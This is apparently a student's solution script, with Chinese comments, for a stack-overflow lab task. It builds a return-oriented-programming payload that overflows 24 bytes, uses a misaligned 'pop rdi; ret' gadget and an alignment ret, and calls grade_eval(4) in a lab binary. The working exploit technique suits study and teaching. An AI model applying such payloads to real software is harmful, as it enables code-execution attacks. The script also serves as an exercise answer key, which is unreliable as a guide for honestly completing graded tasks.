#!/usr/bin/env python3
"""任务6：ROP —— dark-calc-nx 栈不可执行且随机，用 non-PIE 代码段的 gadget
调用 grade_eval(4)，让输出包含 "Hope A will be your grade!"。

代码段地址固定（non-PIE），所以 gadget 地址可以硬编码。我们只需要：
  1) 把第一个参数 rdi 设成 4；
  2) 跳到 grade_eval。
在 __libc_csu_init 里有一段 "41 5f c3"（pop %r15 ; ret），从中间一个字节
0x401a33 开始解码就是 "5f c3" = "pop %rdi ; ret"，正好用来设 rdi。

ROP 链（覆盖返回地址起，偏移同样是 24）：
    pop rdi ; ret   (0x401a33)
    4               → rdi
    ret             (0x401a34)  ← 对齐填充：使 grade_eval 入口 rsp ≡ 8 (mod16)
    grade_eval      (0x401978)
对齐这一步是必须的：少了它 grade_eval 调用 printf 时栈不对齐，会崩在 printf 内部。
"""
import sys

RET_OFFSET = 24
POP_RDI    = 0x401a33       # pop %rdi ; ret （csu 里错位解码得到）
RET        = 0x401a34       # ret （对齐用）
GRADE_EVAL = 0x401978

def p64(x):
    return x.to_bytes(8, "little")

payload  = b"A" * RET_OFFSET
payload += p64(POP_RDI)
payload += p64(4)
payload += p64(RET)
payload += p64(GRADE_EVAL)

sys.stdout.buffer.write(payload)
